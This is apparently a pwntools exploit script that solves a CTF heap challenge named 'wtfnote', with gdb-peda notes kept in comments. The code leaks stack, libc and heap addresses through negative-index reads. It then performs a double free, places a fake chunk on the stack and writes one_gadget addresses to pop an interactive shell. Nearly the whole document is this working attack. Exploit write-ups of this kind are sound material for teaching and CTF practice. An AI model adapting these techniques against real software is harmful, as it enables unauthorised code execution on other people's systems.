from pwn import *
from termcolor import *
# has canary / nx enable / no pie / full relro
def alloc(size,data):
	# 0 <= size < 0x58 -> only can read/write 60 series.
	# we can allocate 20s blocks.
	r.sendafter('> ','1')
	r.sendafter('size: ',str(size))
	r.sendafter('content: ',str(data))

def get(idx):
	r.sendafter('> ','2')
	r.sendafter('index: ',str(idx))
	return r.recvline()[:-1]


def delete(idx):
	r.sendafter('> ','3')
	r.sendafter('index: ',str(idx))


r = process('./wtfnote')

# r = remote('csie.ctf.tw',10135)

context.arch='amd64'
# run peda
# RBP: 0x7fffffffdbc0 --> 0x555555554e50 (<__libc_csu_init>:	push   r15)
# refsearch 0x555555554e50
# get  0x7fffffffda00 --> 0x7fffffffdae0 --> 0x7fffffffdb00 --> 0x7fffffffdbc0 --> 0x555555554e50 (<__libc_csu_init>:	push   r15)
# Now, rsp = 0x7fffffffdb10
# we use 0x7fffffffdae0, get 0x7fffffffdb00, find 0x7fffffffdbc0, 
#      (rsp -0x30 = 8*-6)                            (rsp+0xb0)                            
main_rsp = u64(get(-6).ljust(8,'\x00')) - 0xb0
print(colored('{: <20s}: %x'.format('main_rsp') % main_rsp,'red'))
# By last line,
# 0x7fffffffdb00 --> 0x7fffffffdbc0 --> 0x555555554e50 (<__libc_csu_init>:	push   r15)
# we use 0x7fffffffdb00, get 0x7fffffffdbc0, find 0x555555554e50, 
#      (rsp -0x10 = 8*-2)                        <__libc_csu_init>                            

# leak_csu_init = u64(get(-2).ljust(8,'\x00')) 
# print(colored('{: <20s}: %x'.format('__libc_csu_init') % leak_csu_init,'red'))
# No... leak csu init is useless... it's not in libc.so...

# print 
# [stack] : 0x7fffffffd3f0 --> 0x7fffffffd468 --> 0x7ffff7dd2620 --> 0xfbad2887 
# we use 0x7fffffffd3f0, get 0x7fffffffd468, find 0x7ffff7dd2620, 
#          (rsp -228*8 )                        <stdout>                            

#    803: 00000000003c4620   224 OBJECT  GLOBAL DEFAULT   33 _IO_2_1_stdout_@@GLIBC_2.2.5

# gdb-peda$ distance 0x7ffe5f6dce08
# From 0x7ffe5f6dcf30 (SP) to 0x7ffe5f6dce08: -296 bytes, -74 dwords
# [stack] : 0x7ffe5f6dcab8 --> 0x7ffe5f6dce70 --> 0x7f8e7c130a31 
# [stack] : 0x7ffe5f6dce08 --> 0x7ffe5f6dce70 --> 0x7f8e7c130a31 


# leak_stdout = u64(get(-228).ljust(8,'\x00')) 
# stdout_offset = 0x3c4620
# libc_base = leak_stdout - stdout_offset
# print(colored('{: <20s}: %x'.format('leak_stdout') % leak_stdout,'red'))
# print(colored('{: <20s}: %x'.format('libc_base') % libc_base,'red'))

# start when 0x7ffcca8b8160 ~
# RSP: 0x7ffcca8b8230
#-> read -25 + ptr I want 

# 0x7ffcca8b82e0:	0x000055cf622e9e50	0x00007f14b890d830
# from $rsp search useful data. -> 0x00007f14b890d830

# gdb-peda$ x/gx 0x00007f14b890d830
# 0x7f14b890d830 <__libc_start_main+240>:	0x31000197f9e8c789
# gdb-peda$ distance 0x7ffcca8b82e8
# From 0x7ffcca8b8230 (SP) to 0x7ffcca8b82e8: 184 bytes, 46 dwords
#   2118: 0000000000020740   458 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5
__libc_start_main_offset = 0x20740
leak_start_main = u64(get('-25'.ljust(8,b'\x00') + p64(main_rsp+23*8)) . ljust(8,b'\x00'))-240
libc_base = leak_start_main - __libc_start_main_offset
print(colored('{: <20s}: %x'.format('leak_start_main') % leak_start_main,'red'))
print(colored('{: <20s}: %x'.format('libc_base') % libc_base,'red'))

###Leak first malloc_block_addr
alloc(0x58, 'A'*0x58)

alloc(0x58, 'A'*0x58)
# leak_heap_start = u64(get(b'0'.ljust(8,b'\x00') + p64(main_rsp)) . ljust(8,b'\x00'))-240
# print(colored('{: <20s}: %x'.format('leak_start_main') % leak_start_main,'red'))
# raw_input('stop!')
'''
0x7fffffffda28:	0x00007ffff7a43e90	0x0000000000000000
0x7fffffffda38:	0x0000555555554a81	0x00007ffff7dd3780
0x7fffffffda48:	0x00000080f7b042c0	0x4141414141412032
0x7fffffffda58:	0x4141414141414141	0x4141414141414141

rsp : 0x7fffffffdb10
'''
'''
0024| 0x7ffddabe0670 --> 0x35322d ('-25')
0032| 0x7ffddabe0678 --> 0x7ffddabe0670 --> 0x35322d ('-25')
0040| 0x7ffddabe0680 --> 0x7ffddabe0740 --> 0x55e4a7808010 ('A' <repeats 87 times>)

[stack] : 0x7ffddabe05e8 --> 0x7ffddabe0740 --> 0x55e4a7808010 ('A' <repeats 87 times>)
[stack] : 0x7ffddabe0718 --> 0x7ffddabe0740 --> 0x55e4a7808010 ('A' <repeats 87 times>)

'''

leak_heap_start = u64(get('-25'.ljust(8,b'\x00')+p64(main_rsp)).ljust(8,b'\x00'))
print(colored('{: <20s}: %x'.format('leak_heap_start') % leak_heap_start,'red'))



# not work, because it'll check and pass if memory is  0
# delete(str('-25').ljust(8,b'\x00') + p64(leak_heap_start-0xd0+0x10))
'''



def delete(idx):
	r.sendafter('> ','3')
	r.sendafter('index: ',str(idx))

'''
delete(0)
delete(1)
r.sendafter('> ','3'.ljust(8,b'\x00')+p64(leak_heap_start))
r.sendafter('index: ',str(-23))
# delete(str('-25').ljust(8,b'\x00') + )
	

# 0024| 0x7ffda97f2b48 ('A' <repeats 30 times>)
# RSP: 0x7ffda97f2c00 
#      0x7ffd74314f20,

# double free


'''
main rsp: RSP: 0x7fffffffdae0 

'''
alloc(0x58,p64(main_rsp - 0x68))
print(colored('{: <20s}: %x'.format("F block") % (main_rsp-0x68)	,'red'))

alloc(0x58,'D'*0x58)
alloc(0x58,'E'*0x58)
r.sendlineafter('> ',b'1'.ljust(0x60,'F')+p64(0x61))
# raw_input('stop!')
'''
0x45216	rax == NULL
0x4526a	rsp+0x30
0xef6c4	rsp+0x50
0xf0567	rsp+0x70
'''

r.sendafter('size: ',str(0x58))
r.sendafter('content: ','\x00'*0x10+p64(libc_base+0x33544)+p64(0)+p64(libc_base+0x45216))
r.interactive()


